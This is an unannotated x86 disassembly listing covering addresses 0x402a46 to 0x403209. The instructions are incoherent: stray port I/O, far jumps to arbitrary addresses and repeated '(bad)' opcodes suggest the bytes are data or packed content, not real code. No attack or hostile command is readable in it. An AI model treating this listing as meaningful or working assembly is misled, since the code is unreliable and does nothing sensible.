  402a46:	jmp    0x402a22
  402a48:	aas    
  402a49:	and    al,BYTE PTR [edx]
  402a4b:	add    eax,0x7697d918
  402a50:	out    0x90,eax
  402a52:	dec    edi
  402a53:	mov    esp,0xddf6c11d
  402a58:	mov    edi,0x6675b224
  402a5d:	pop    ss
  402a5e:	lea    esp,[edi-0x67c96669]
  402a64:	xor    al,0x39
  402a66:	ins    DWORD PTR es:[edi],dx
  402a67:	sti    
  402a68:	mov    ecx,0x1a223fd3
  402a6d:	in     al,dx
  402a6e:	pop    esp
  402a6f:	out    0x58,al
  402a71:	stc    
  402a72:	push   eax
  402a73:	jne    0x402a57
  402a75:	fwait
  402a76:	div    BYTE PTR [edx+edx*1+0x42]
  402a7a:	out    0x4,eax
  402a7c:	retf   
  402a7d:	cmp    DWORD PTR ds:0x2ab78b82,edx
  402a83:	or     DWORD PTR [ebx],ebp
  402a85:	mov    al,0x85
  402a87:	push   ss
  402a88:	jmp    0x402ab0
  402a8a:	retf   0xa49a
  402a8d:	dec    edi
  402a8e:	jmp    0x92b39826
  402a93:	arpl   WORD PTR [edi],bx
  402a95:	mov    esi,ss
  402a97:	ror    ebx,1
  402a99:	pop    ds
  402a9a:	(bad)  
  402a9c:	fisub  WORD PTR ds:0x9f8318f7
  402aa2:	out    dx,al
  402aa3:	popa   
  402aa4:	jp     0x402ad2
  402aa6:	hlt    
  402aa7:	push   ebp
  402aa8:	add    eax,0x8c5463c4
  402aad:	xchg   ebx,eax
  402aae:	aaa    
  402aaf:	leave  
  402ab0:	shl    BYTE PTR [edx-0x80],cl
  402ab3:	fs xor eax,0xf49f2773
  402ab9:	inc    ebx
  402aba:	retf   
  402abb:	lods   eax,DWORD PTR ds:[esi]
  402abc:	shr    BYTE PTR [ebp+0x2ac4875d],cl
  402ac2:	out    dx,al
  402ac3:	adc    eax,0x8cdf0adf
  402ac8:	aad    0x71
  402aca:	test   eax,0x597ade75
  402acf:	cmp    BYTE PTR [ecx+0x6c17ac2b],bh
  402ad5:	add    eax,0x4750965b
  402ada:	mov    dl,0xda
  402adc:	xchg   edi,eax
  402add:	test   ecx,esp
  402adf:	loop   0x402b46
  402ae1:	push   es
  402ae2:	inc    edi
  402ae3:	xchg   edi,eax
  402ae4:	jno    0x402b21
  402ae6:	mov    bh,0x8f
  402ae8:	sbb    ch,BYTE PTR [ebx+0x20]
  402aeb:	pop    ss
  402aec:	fsub   QWORD PTR [ecx-0x24]
  402aef:	mov    ds:0xe00923cc,al
  402af4:	out    0x5c,al
  402af6:	mov    dh,0x4b
  402af8:	cli    
  402af9:	xchg   esp,eax
  402afa:	dec    edi
  402afb:	mov    ah,0x45
  402afd:	fidivr WORD PTR [ebp+0x18883789]
  402b03:	and    al,0x2
  402b05:	sti    
  402b06:	sub    dl,BYTE PTR [ebp-0xf]
  402b09:	mov    edi,0x62baccf2
  402b0e:	add    DWORD PTR [edx+0x71],eax
  402b11:	scas   eax,DWORD PTR es:[edi]
  402b12:	pushf  
  402b13:	aas    
  402b14:	jnp    0x402ade
  402b16:	pop    ecx
  402b17:	enter  0xb3bb,0xb
  402b1b:	sbb    bl,bh
  402b1d:	cdq    
  402b1e:	loopne 0x402b29
  402b20:	jecxz  0x402ada
  402b22:	and    bh,ah
  402b24:	push   esi
  402b25:	and    al,BYTE PTR [edi+0x3c7fc688]
  402b2b:	dec    esi
  402b2c:	pop    esi
  402b2d:	fistp  WORD PTR [ecx-0x4bc9ef40]
  402b33:	int    0x25
  402b35:	aaa    
  402b36:	loop   0x402ae3
  402b38:	repnz cmp DWORD PTR [esi-0x73],0xd5ce7aeb
  402b40:	test   BYTE PTR [ecx-0x51],cl
  402b43:	retf   0x7418
  402b46:	add    ebp,DWORD PTR [esi-0x50093d44]
  402b4c:	jmp    0x402bb8
  402b4e:	mov    ch,0x6c
  402b50:	test   eax,0x9dd0b9a8
  402b55:	popa   
  402b56:	dec    edx
  402b57:	push   ds
  402b58:	jno    0x402bb1
  402b5a:	inc    ebx
  402b5b:	and    esp,DWORD PTR [eax+0x1fa70452]
  402b61:	mov    dl,0x82
  402b63:	es retf 0x344
  402b67:	int    0x40
  402b69:	xlat   BYTE PTR ds:[ebx]
  402b6a:	mov    dh,BYTE PTR [edx-0x1a1b85c6]
  402b70:	addr16 shl ebx,0x48
  402b74:	sub    DWORD PTR [ecx+ecx*8+0x7b],edi
  402b78:	inc    esi
  402b79:	sbb    eax,0x852fe42c
  402b7e:	mov    cl,0x66
  402b80:	xchg   edi,eax
  402b81:	lahf   
  402b82:	and    DWORD PTR [edi-0x5d],0x55
  402b86:	push   edi
  402b87:	or     al,0x37
  402b89:	fs sbb bl,bh
  402b8c:	daa    
  402b8d:	inc    ebp
  402b8e:	and    ah,dh
  402b90:	pushf  
  402b91:	cmc    
  402b92:	push   ecx
  402b93:	sub    ecx,DWORD PTR [ebp*2-0x5ff203f7]
  402b9a:	stos   BYTE PTR es:[edi],al
  402b9b:	popa   
  402b9c:	push   ebp
  402b9d:	cmp    ecx,DWORD PTR [edi]
  402b9f:	push   eax
  402ba0:	mov    BYTE PTR [ecx+0x20],al
  402ba3:	cs inc edi
  402ba5:	jo     0x402c24
  402ba7:	icebp  
  402ba8:	lds    ebx,FWORD PTR [ebx-0x1a272c18]
  402bae:	pusha  
  402baf:	jmp    0xf7dd6226
  402bb4:	loope  0x402bb8
  402bb6:	outs   dx,DWORD PTR ds:[esi]
  402bb7:	pop    es
  402bb8:	test   BYTE PTR [edi+0x45],bh
  402bbb:	jp     0x402bcd
  402bbd:	mov    ch,0xb8
  402bbf:	jno    0x402be5
  402bc1:	xchg   BYTE PTR [edi],cl
  402bc3:	fiadd  DWORD PTR [ebx+0x6b89d1c1]
  402bc9:	pop    edx
  402bca:	pop    esi
  402bcb:	in     al,dx
  402bcc:	sub    al,0x8
  402bce:	cdq    
  402bcf:	jl     0x402b6b
  402bd1:	jno    0x402bf0
  402bd3:	cs data16 lock es xor al,0xcc
  402bd9:	mov    al,0x24
  402bdb:	mov    ds,esi
  402bdd:	push   esp
  402bde:	test   DWORD PTR ds:0x2fe247f1,eax
  402be4:	bound  eax,QWORD PTR [ebp-0x8]
  402be7:	retf   
  402be8:	add    al,0xc3
  402bea:	bound  edx,QWORD PTR [ebx-0x6d8f499d]
  402bf0:	or     DWORD PTR [edi],ecx
  402bf2:	test   BYTE PTR [edi],ah
  402bf4:	retf   
  402bf5:	pop    esi
  402bf6:	jmp    0x402bf3
  402bf8:	add    BYTE PTR ds:[ebx],ah
  402bfb:	xchg   BYTE PTR [ebx+0x3e02ae5a],dl
  402c01:	inc    ecx
  402c02:	out    dx,eax
  402c03:	xchg   ecx,eax
  402c04:	pop    es
  402c05:	pop    eax
  402c06:	loop   0x402bd6
  402c08:	sti    
  402c09:	xchg   BYTE PTR [esi],bl
  402c0b:	mov    dh,0xba
  402c0d:	mov    ebx,0xc81d84ac
  402c12:	(bad)  [eax-0x6dc6280e]
  402c18:	loope  0x402c4b
  402c1a:	push   esi
  402c1b:	mov    bl,0xd8
  402c1d:	addr16 call 0x6ca7:0xe3bd2ef8
  402c25:	test   al,0xf2
  402c27:	xchg   esp,eax
  402c28:	dec    esi
  402c29:	shr    BYTE PTR [ebx+ecx*2+0x6fa747f9],cl
  402c30:	pop    es
  402c31:	outs   dx,DWORD PTR ds:[esi]
  402c32:	fidivr WORD PTR [ecx-0x7155f180]
  402c38:	inc    ebx
  402c39:	mov    ds:0x7a92d80a,eax
  402c3e:	add    al,0xfb
  402c40:	pop    esi
  402c41:	mov    ah,0x99
  402c43:	and    esi,DWORD PTR [edx-0x5b]
  402c46:	stos   BYTE PTR es:[edi],al
  402c47:	frstpm(287 only) 
  402c49:	lods   eax,DWORD PTR ds:[esi]
  402c4a:	sub    al,0x4e
  402c4c:	imul   ebx,DWORD PTR [eax+eiz*2-0x8154e79],0x7a
  402c54:	das    
  402c55:	dec    ebx
  402c56:	pop    ecx
  402c57:	or     al,0xab
  402c59:	add    eax,0xcba72d75
  402c5e:	fistp  DWORD PTR [edx-0x52]
  402c61:	adc    ebx,eax
  402c63:	popf   
  402c64:	xchg   esp,eax
  402c65:	bound  eax,QWORD PTR [eax-0x39d8c13d]
  402c6b:	je     0x402cdd
  402c6d:	add    ebx,DWORD PTR [esp+eax*8-0x2e]
  402c71:	mov    dh,0xfd
  402c73:	adc    ecx,DWORD PTR [eax+0x6e1b80a0]
  402c79:	xchg   BYTE PTR [ecx+ebx*8],dh
  402c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7d:	pop    edi
  402c7e:	dec    esi
  402c7f:	mov    BYTE PTR [eax-0x7c88a4e7],dh
  402c85:	mov    bh,0xe2
  402c87:	iret   
  402c88:	fimul  DWORD PTR [eax+0x6]
  402c8b:	gs push eax
  402c8d:	adc    DWORD PTR [eax-0x29],0x157b8802
  402c94:	ret    0x23a3
  402c97:	or     bl,ah
  402c99:	cmp    cl,BYTE PTR ds:[ebx]
  402c9c:	and    BYTE PTR [esi-0x4aebd60b],bh
  402ca2:	inc    edi
  402ca3:	pusha  
  402ca4:	ror    BYTE PTR [ecx+eax*4+0x78],cl
  402ca8:	rcl    BYTE PTR [ecx+0x6f51e08b],cl
  402cae:	leave  
  402caf:	push   ebp
  402cb0:	adc    DWORD PTR [esi],ebp
  402cb2:	sub    al,0x16
  402cb4:	cmp    BYTE PTR [edx],ch
  402cb6:	jp     0x402cee
  402cb8:	inc    esi
  402cb9:	xor    al,0xfe
  402cbb:	pop    ebx
  402cbc:	lds    edi,FWORD PTR [edi-0x60]
  402cbf:	js     0x402c89
  402cc1:	or     al,0xb1
  402cc3:	mov    edi,0x5d46907f
  402cc8:	popf   
  402cc9:	int    0x1
  402ccb:	adc    edx,edi
  402ccd:	xchg   dh,ah
  402ccf:	fist   DWORD PTR [ecx]
  402cd1:	add    dh,dh
  402cd3:	or     edx,DWORD PTR [ecx+0x7b]
  402cd6:	es pushf 
  402cd8:	add    DWORD PTR [esi-0x6a3295b0],edx
  402cde:	je     0x402cd0
  402ce0:	add    ah,cl
  402ce2:	adc    ax,0xf3ab
  402ce6:	pop    ebx
  402ce7:	mov    ds:0xb7e17501,al
  402cec:	retf   
  402ced:	pop    ss
  402cee:	and    BYTE PTR [eax+ecx*1+0x5],cl
  402cf2:	mov    esp,DWORD PTR [ebp+0x1c05b376]
  402cf8:	jae    0x402cbf
  402cfa:	cmp    esi,DWORD PTR [edi]
  402cfc:	repnz scas al,BYTE PTR es:[edi]
  402cfe:	cli    
  402cff:	xchg   BYTE PTR [edx-0x50],cl
  402d02:	mov    al,ds:0x1f615c2b
  402d07:	lahf   
  402d08:	or     BYTE PTR [ebp-0x1f],ch
  402d0b:	(bad)  
  402d0c:	jg     0x402d61
  402d0e:	mov    al,0x4e
  402d10:	sub    DWORD PTR [esp+edi*2],0xef0ee78a
  402d17:	test   DWORD PTR [ecx+0x9],ebp
  402d1a:	jmp    0xf1325f54
  402d1f:	out    0x34,eax
  402d21:	inc    edx
  402d22:	jne    0x402d07
  402d24:	mov    ebp,0xf368e5fe
  402d29:	sbb    eax,esi
  402d2b:	repz cmp BYTE PTR [eax+esi*2-0xb15dd6b],ch
  402d33:	and    BYTE PTR [edi],0xc1
  402d36:	jl     0x402cf2
  402d38:	add    BYTE PTR [eax-0x2c],dh
  402d3b:	xor    edi,DWORD PTR [ebx+0xd544d]
  402d41:	cdq    
  402d42:	adc    al,BYTE PTR [ecx]
  402d44:	adc    BYTE PTR [edx-0x69727667],cl
  402d4a:	or     BYTE PTR [ebx+0x7b],dl
  402d4d:	sub    eax,0x31b1ca87
  402d52:	dec    ebp
  402d53:	inc    esi
  402d54:	outs   dx,DWORD PTR ds:[esi]
  402d55:	enter  0x1c92,0xbd
  402d59:	pop    ebx
  402d5a:	rep ins BYTE PTR es:[edi],dx
  402d5c:	test   eax,edx
  402d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d5f:	shl    edx,1
  402d61:	lea    edi,[ebp+ebp*2-0x7e88ac9d]
  402d68:	repz les eax,FWORD PTR [edx]
  402d6b:	imul   dx,bx,0xffb5
  402d6f:	std    
  402d70:	(bad)  
  402d71:	or     al,0x5c
  402d73:	shr    BYTE PTR [edi+edx*1-0x9ef1c94],1
  402d7a:	pop    eax
  402d7b:	sub    DWORD PTR [eax],ebp
  402d7d:	pushf  
  402d7e:	iret   
  402d7f:	jmp    0xbedd1c55
  402d84:	xor    DWORD PTR [esi-0xf162f0c],ecx
  402d8a:	pop    ss
  402d8b:	test   eax,0x41fabccc
  402d90:	xlat   BYTE PTR ds:[ebx]
  402d91:	inc    eax
  402d92:	sub    DWORD PTR [edx],esp
  402d94:	cmc    
  402d95:	sub    al,0x1a
  402d97:	or     ch,al
  402d99:	inc    ebp
  402d9a:	fs in  al,dx
  402d9c:	xchg   DWORD PTR [ecx-0x65115e31],edi
  402da2:	int    0x6e
  402da4:	dec    ebp
  402da5:	inc    esi
  402da6:	call   0x7dc5:0xb93453f2
  402dad:	cwde   
  402dae:	lea    eax,[ebp+0x5b4a45d4]
  402db4:	push   ecx
  402db5:	test   al,0xbf
  402db7:	in     al,dx
  402db8:	xlat   BYTE PTR ds:[ebx]
  402db9:	pop    es
  402dba:	jmp    0xac8203a1
  402dbf:	pusha  
  402dc0:	out    dx,al
  402dc1:	fisttp QWORD PTR [ecx-0x4430b38d]
  402dc7:	clc    
  402dc8:	xchg   ecx,eax
  402dc9:	imul   ebx,DWORD PTR [ebp-0x15],0x541e3a5b
  402dd0:	int3   
  402dd1:	stos   DWORD PTR es:[edi],eax
  402dd2:	mov    bh,0xed
  402dd4:	ins    DWORD PTR es:[edi],dx
  402dd5:	pop    esp
  402dd6:	dec    ebp
  402dd7:	pop    ss
  402dd8:	mov    ch,0x4
  402dda:	sub    BYTE PTR [ebx+0x56],al
  402ddd:	mov    al,0xd5
  402ddf:	(bad)  
  402de0:	fiadd  WORD PTR [edi+0x20]
  402de3:	imul   edx,DWORD PTR [ebp-0x7c8ef587],0x6cc13ced
  402ded:	shl    DWORD PTR [eax],0xaf
  402df0:	cli    
  402df1:	push   ecx
  402df2:	sbb    edx,DWORD PTR [ecx-0x2c]
  402df5:	dec    edx
  402df6:	ins    BYTE PTR es:[edi],dx
  402df7:	out    0xed,al
  402df9:	mov    esp,0x877b337c
  402dfe:	and    eax,0xc00943d6
  402e03:	imul   ebx,DWORD PTR [ebx+0x2a],0x5b
  402e07:	scas   al,BYTE PTR es:[edi]
  402e08:	arpl   WORD PTR [ebx],dx
  402e0a:	test   eax,0xbefce3ee
  402e0f:	ss push edx
  402e11:	pusha  
  402e12:	aad    0x40
  402e14:	ss inc ecx
  402e16:	push   es
  402e17:	leave  
  402e18:	pop    ds
  402e19:	jmp    0x80da3c63
  402e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e1f:	es clc 
  402e21:	leave  
  402e22:	fstp   DWORD PTR [esi+0x14062d2f]
  402e28:	cmp    eax,0x61e781d9
  402e2d:	pop    ebx
  402e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e2f:	xchg   DWORD PTR [ebp-0x5a],edi
  402e32:	sub    bl,BYTE PTR [esi+0x7e9eca07]
  402e38:	adc    al,0x7c
  402e3a:	or     esi,ebp
  402e3c:	mov    ch,0xcd
  402e3e:	and    eax,0x34f6e909
  402e43:	repz repnz mov bh,0x87
  402e47:	jb     0x402df1
  402e49:	xchg   ecx,eax
  402e4a:	xor    eax,0xd0d2b4b0
  402e4f:	push   edi
  402e50:	mov    eax,0x1598fec0
  402e55:	mov    esp,0x41a17895
  402e5a:	mov    dl,0x61
  402e5c:	or     dl,dl
  402e5e:	push   ecx
  402e5f:	inc    esi
  402e60:	mov    ebx,0x43660936
  402e65:	pop    ebx
  402e66:	cs sub ebp,edx
  402e69:	pop    eax
  402e6a:	mov    ch,0x93
  402e6c:	jmp    0x1b5b6a4
  402e71:	pop    ebx
  402e72:	dec    ebx
  402e73:	(bad)  
  402e74:	repnz stos BYTE PTR es:[edi],al
  402e76:	scas   al,BYTE PTR es:[edi]
  402e77:	test   DWORD PTR [esi+0x5d],esi
  402e7a:	jle    0x402ee1
  402e7c:	sub    DWORD PTR [esi+0x2a6b3f1c],ecx
  402e82:	aad    0xe9
  402e84:	mov    dh,0xa7
  402e86:	(bad)  
  402e87:	jb     0x402eb3
  402e89:	jl     0x402eef
  402e8b:	mov    cl,0x61
  402e8d:	mov    bl,BYTE PTR [eax+0x182b7f27]
  402e93:	into   
  402e94:	loop   0x402e4e
  402e96:	lods   eax,DWORD PTR ds:[esi]
  402e97:	jns    0x402ec2
  402e99:	aaa    
  402e9a:	jmp    0x402e5f
  402e9c:	retf   
  402e9d:	inc    eax
  402e9e:	sub    esi,ebx
  402ea0:	xchg   edi,eax
  402ea1:	and    ebx,DWORD PTR [eax+0x2354c06f]
  402ea7:	fld    DWORD PTR [edx]
  402ea9:	mov    ecx,0xc9e68325
  402eae:	mov    cl,0xb
  402eb0:	je     0x402f22
  402eb2:	and    BYTE PTR [ecx+0x65],ch
  402eb5:	out    dx,eax
  402eb6:	pop    ds
  402eb7:	fidiv  WORD PTR [edx+0x4bcb9383]
  402ebd:	lea    ecx,[esi]
  402ebf:	and    eax,0x9988eb13
  402ec4:	pop    esi
  402ec5:	int3   
  402ec6:	clc    
  402ec7:	jle    0x402f32
  402ec9:	add    al,0x63
  402ecb:	xlat   BYTE PTR ds:[ebx]
  402ecc:	xor    bh,ch
  402ece:	pop    ebx
  402ecf:	jae    0x402f49
  402ed1:	mov    ah,0x6f
  402ed3:	loopne 0x402e9b
  402ed5:	out    0x7b,eax
  402ed7:	cmp    ebx,DWORD PTR [ecx-0x2d39f957]
  402edd:	mov    cl,bl
  402edf:	rcr    dh,1
  402ee1:	push   ecx
  402ee2:	shl    BYTE PTR [edx-0x7dd82750],0x92
  402ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eea:	xor    DWORD PTR [ecx-0x7bb9c733],esi
  402ef0:	dec    edx
  402ef1:	loop   0x402ebe
  402ef3:	dec    esp
  402ef4:	xchg   ecx,eax
  402ef5:	mov    cl,0x73
  402ef7:	add    bh,bh
  402ef9:	push   esi
  402efa:	scas   eax,DWORD PTR es:[edi]
  402efb:	dec    edi
  402efc:	add    al,0x19
  402efe:	pop    es
  402eff:	cld    
  402f00:	xchg   ebp,eax
  402f01:	xor    eax,0x199b3e4c
  402f06:	retf   0xd53b
  402f09:	dec    ebx
  402f0a:	xchg   edx,eax
  402f0b:	lds    ebp,FWORD PTR [ecx-0x7cccd2ce]
  402f11:	pushf  
  402f12:	arpl   WORD PTR [esi+0x3c814ec2],ax
  402f18:	test   DWORD PTR [edi-0x3670fe99],esp
  402f1e:	push   edx
  402f1f:	cmc    
  402f20:	ret    0xb3b4
  402f23:	xchg   DWORD PTR [edx-0xef9d60],ebx
  402f29:	xchg   BYTE PTR [ebx-0x245a158f],bl
  402f2f:	(bad)  
  402f30:	dec    ebx
  402f31:	ret    
  402f32:	inc    esi
  402f33:	ret    
  402f34:	in     al,0x3d
  402f36:	push   0x81d16420
  402f3b:	fidivr WORD PTR [edi+ebp*4-0x650c08ec]
  402f42:	or     eax,0xf2b15a2a
  402f47:	fstp   DWORD PTR ds:0xd9225a0a
  402f4d:	sbb    dl,BYTE PTR ds:0x2504e315
  402f53:	data16 aas 
  402f55:	dec    ecx
  402f56:	xor    BYTE PTR [esi+0x62],0xb6
  402f5a:	adc    al,0x24
  402f5c:	scas   eax,DWORD PTR es:[edi]
  402f5d:	into   
  402f5e:	aas    
  402f5f:	mov    BYTE PTR [edx+0x35bd8306],dl
  402f65:	sbb    bl,cl
  402f67:	retf   
  402f68:	(bad)  
  402f6a:	or     ebp,DWORD PTR [esp+esi*4-0x572d19d9]
  402f71:	ds repz retf 
  402f74:	mov    ch,0x68
  402f76:	sar    BYTE PTR [ecx-0x2],cl
  402f79:	imul   ebp,eax,0xffffffd0
  402f7c:	sub    al,0xf3
  402f7e:	xchg   ecx,eax
  402f7f:	cs aaa 
  402f81:	rol    DWORD PTR [ebp+0x799d0d88],cl
  402f87:	pop    eax
  402f88:	not    BYTE PTR [ebx]
  402f8a:	and    al,0x59
  402f8c:	push   esi
  402f8d:	in     eax,0x64
  402f8f:	sub    esp,DWORD PTR [edx]
  402f91:	xchg   esi,eax
  402f92:	out    dx,al
  402f93:	adc    eax,0x3b528eb4
  402f98:	fistp  DWORD PTR [ebx-0x63422f12]
  402f9e:	adc    eax,0x7e8275b7
  402fa3:	leave  
  402fa4:	add    BYTE PTR [ebx-0x54],dh
  402fa7:	push   cs
  402fa8:	xor    esi,edx
  402faa:	lods   eax,DWORD PTR ds:[esi]
  402fab:	outs   dx,BYTE PTR ds:[esi]
  402fac:	popa   
  402fad:	in     al,0xd1
  402faf:	mov    esi,DWORD PTR [ecx+0x18654dcc]
  402fb5:	pop    ss
  402fb6:	pop    es
  402fb7:	add    ch,BYTE PTR [esp+edi*1+0x96c35cb]
  402fbe:	pop    ds
  402fbf:	inc    ecx
  402fc0:	ds pop edi
  402fc2:	xchg   ecx,eax
  402fc3:	nop
  402fc4:	ret    
  402fc5:	arpl   WORD PTR [esi],sp
  402fc7:	shl    BYTE PTR ds:0x238412e0,1
  402fcd:	pop    es
  402fce:	fld    TBYTE PTR [eax+esi*8-0x3d12c21a]
  402fd5:	in     al,0xa0
  402fd7:	lahf   
  402fd8:	dec    ecx
  402fd9:	shr    DWORD PTR [ebx-0x4f141f80],1
  402fdf:	por    mm5,QWORD PTR [ecx+edi*8-0x254106dc]
  402fe7:	sbb    edi,DWORD PTR [edi]
  402fe9:	xchg   BYTE PTR [eax+0x7c],bl
  402fec:	dec    eax
  402fed:	out    0x70,eax
  402fef:	push   eax
  402ff0:	(bad)  
  402ff1:	(bad)  
  402ff2:	adc    ah,dh
  402ff4:	(bad)  
  402ff5:	outs   dx,BYTE PTR ds:[esi]
  402ff6:	pop    es
  402ff7:	icebp  
  402ff8:	xor    esi,DWORD PTR [ecx+0x4a]
  402ffb:	out    dx,al
  402ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffd:	fstp   TBYTE PTR [ecx]
  402fff:	je     0x402fcf
  403001:	(bad)  
  403002:	fadd   DWORD PTR [edx]
  403004:	mov    BYTE PTR [esi+0x324631c5],0xb5
  40300b:	cmp    eax,0xac2aac7
  403010:	fstp   DWORD PTR [ecx-0x7d29b293]
  403016:	into   
  403017:	(bad)  
  40301a:	cli    
  40301b:	aam    0xe1
  40301d:	and    esi,0x789ba6a0
  403023:	ret    0xae70
  403026:	in     al,dx
  403027:	jmp    0x11971602
  40302c:	aas    
  40302d:	xchg   esp,eax
  40302e:	jle    0x402fca
  403030:	dec    edi
  403031:	sbb    bh,BYTE PTR [esi+eiz*4+0x3b3b504]
  403038:	cmp    BYTE PTR [ecx+0x1199316e],cl
  40303e:	jg     0x40309c
  403040:	retf   0xab8d
  403043:	push   eax
  403044:	push   0xfffffff0
  403046:	ins    BYTE PTR es:[edi],dx
  403047:	jnp    0x402fff
  403049:	add    ebp,DWORD PTR [ebp+eiz*8+0x3d]
  40304d:	ss cmp al,0x9c
  403050:	and    al,ch
  403052:	and    BYTE PTR [edi-0x56],ah
  403055:	add    ah,BYTE PTR [ecx+eiz*8]
  403058:	leave  
  403059:	xchg   esp,eax
  40305a:	rcr    DWORD PTR [ecx+0x5b],1
  40305d:	push   DWORD PTR [esi-0x4f12e4e5]
  403063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403064:	arpl   WORD PTR [ebp-0x6f],dx
  403067:	mov    ds:0xd4be6ed4,al
  40306c:	dec    ebp
  40306d:	and    eax,0xffbb0215
  403072:	aaa    
  403073:	stos   DWORD PTR es:[edi],eax
  403074:	cs imul al
  403077:	and    ebp,edx
  403079:	jp     0x402ffb
  40307b:	pop    ebp
  40307c:	sbb    BYTE PTR [edi-0x63],0x6d
  403080:	aad    0x1e
  403082:	mov    esp,0x52ce1579
  403087:	push   ebx
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	sbb    BYTE PTR [esi],0x1b
  40308c:	mov    es,edi
  40308e:	inc    ecx
  40308f:	add    edi,esp
  403091:	push   esp
  403092:	add    DWORD PTR [ecx-0x47],edi
  403095:	xchg   ecx,eax
  403096:	int3   
  403097:	mov    bl,0x65
  403099:	sub    DWORD PTR [edx],ebp
  40309b:	loop   0x403097
  40309d:	jmp    0x40302d
  40309f:	cwde   
  4030a0:	or     DWORD PTR ds:0x6abc5317,ecx
  4030a6:	scas   al,BYTE PTR es:[edi]
  4030a7:	adc    DWORD PTR [ebp+ecx*4+0x2772a138],edi
  4030ae:	jmp    0x4d10cd68
  4030b3:	fimul  WORD PTR [edi+0x21]
  4030b6:	cmp    BYTE PTR [edx-0x77],cl
  4030b9:	pop    edx
  4030ba:	call   0x1f52:0xb5ec0ac2
  4030c1:	repnz shr BYTE PTR [ebp+0x4596aa0],cl
  4030c8:	dec    edx
  4030c9:	(bad)  
  4030ca:	push   ebp
  4030cb:	push   edx
  4030cc:	xlat   BYTE PTR ds:[ebx]
  4030cd:	loope  0x4030a9
  4030cf:	adc    BYTE PTR [ecx-0x17651175],dh
  4030d5:	into   
  4030d6:	jbe    0x4030ad
  4030d8:	adc    DWORD PTR [ebx+edi*2-0x14],edi
  4030dc:	xchg   esi,eax
  4030dd:	ins    DWORD PTR es:[edi],dx
  4030de:	jg     0x4030a1
  4030e0:	jne    0x40308b
  4030e2:	mov    dl,0x62
  4030e4:	test   eax,0xc1ec3d6c
  4030e9:	leave  
  4030ea:	in     eax,dx
  4030eb:	mov    dl,bl
  4030ed:	or     DWORD PTR [bp-0x710c],0x3b
  4030f3:	mov    ah,BYTE PTR [edx]
  4030f5:	mov    ch,0xca
  4030f7:	jo     0x403101
  4030f9:	sbb    esp,eax
  4030fb:	js     0x40310b
  4030fd:	retf   
  4030fe:	cld    
  4030ff:	enter  0xb4c8,0x89
  403103:	mov    eax,ds:0x85922547
  403108:	sub    eax,ebp
  40310a:	aas    
  40310b:	mov    esi,0xb8e331f8
  403110:	mov    ah,0xd6
  403112:	cs scas al,BYTE PTR es:[edi]
  403114:	shr    BYTE PTR [eax+edi*8-0x7fdaa7b7],1
  40311b:	push   ecx
  40311c:	mov    edx,0xc87f27de
  403121:	stc    
  403122:	pop    esp
  403123:	push   ecx
  403124:	cs loopne 0x4030c8
  403127:	cli    
  403128:	fdivr  st,st(2)
  40312a:	test   BYTE PTR [ecx-0x6fac56ec],dh
  403130:	shr    DWORD PTR [ecx-0x72df680d],0x6
  403137:	test   bh,0x54
  40313a:	imul   ebp,DWORD PTR [ebx-0x21d2e24d],0x98403d0a
  403144:	jb     0x40319f
  403146:	sbb    al,0xe9
  403148:	jmp    0x3f1ca092
  40314d:	mov    ds:0x5cfdffec,eax
  403152:	clc    
  403153:	jecxz  0x40315d
  403155:	out    dx,eax
  403156:	loopne 0x403181
  403158:	and    bl,ah
  40315a:	push   esp
  40315b:	das    
  40315c:	retf   0x76be
  40315f:	and    BYTE PTR [ebx],ah
  403161:	xchg   edi,eax
  403162:	jl     0x4031ce
  403164:	ficomp WORD PTR [ecx+eiz*8]
  403167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403168:	xchg   BYTE PTR [edx+0x263f1598],bh
  40316e:	or     al,0xca
  403170:	xchg   edx,eax
  403171:	jl     0x4031d1
  403173:	into   
  403174:	lock pop ss
  403176:	xchg   edi,eax
  403177:	or     BYTE PTR [esi+edx*8-0x2],dl
  40317b:	xchg   DWORD PTR [ebx+0x1e],esp
  40317e:	mov    edx,0x448cc1f8
  403183:	(bad)  
  403184:	leave  
  403185:	add    DWORD PTR [ebp+0x4a],0x830fabf5
  40318c:	leave  
  40318d:	ds cs jle 0x403206
  403191:	ja     0x403143
  403193:	fidivr DWORD PTR ds:0x73f57bed
  403199:	scas   al,BYTE PTR es:[edi]
  40319a:	(bad)  
  40319b:	out    dx,al
  40319c:	lahf   
  40319d:	sub    ecx,DWORD PTR [edi+ecx*1+0x36]
  4031a1:	xchg   DWORD PTR [ecx+0x1320153d],ebx
  4031a7:	xor    al,0xa
  4031a9:	sub    DWORD PTR [edi-0x889b92],edx
  4031af:	pusha  
  4031b0:	sub    BYTE PTR [esp+edx*8-0x5a],ah
  4031b4:	ror    DWORD PTR [esi+0x94ea35c],0xd5
  4031bb:	add    ah,BYTE PTR ds:0xdcd1726c
  4031c1:	ror    DWORD PTR [esi-0x15],1
  4031c4:	outs   dx,BYTE PTR ds:[esi]
  4031c5:	add    eax,0xf001eafa
  4031ca:	arpl   si,sp
  4031cc:	mov    edx,0x317a54ae
  4031d1:	or     al,0xa0
  4031d3:	push   edi
  4031d4:	jge    0x403232
  4031d6:	cdq    
  4031d7:	push   ss
  4031d8:	adc    dh,0xb9
  4031db:	call   0xfe98fa16
  4031e0:	pusha  
  4031e1:	outs   dx,BYTE PTR ds:[esi]
  4031e2:	repnz or BYTE PTR [esi],0x1f
  4031e6:	adc    al,0xac
  4031e8:	cli    
  4031e9:	in     al,dx
  4031ea:	aad    0x71
  4031ec:	push   ebx
  4031ed:	jae    0x40325c
  4031ef:	xchg   edx,eax
  4031f0:	loop   0x40324a
  4031f2:	lods   eax,DWORD PTR ds:[esi]
  4031f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f4:	mov    al,ds:0xced4cc43
  4031f9:	cmp    BYTE PTR [ecx+0x5],bh
  4031fc:	pushf  
  4031fd:	xor    edi,edx
  4031ff:	enter  0x5cb5,0xeb
  403203:	lock mov ds:0x840c2c56,al
  403209:	sar    BYTE PTR [ebx+0x45],cl
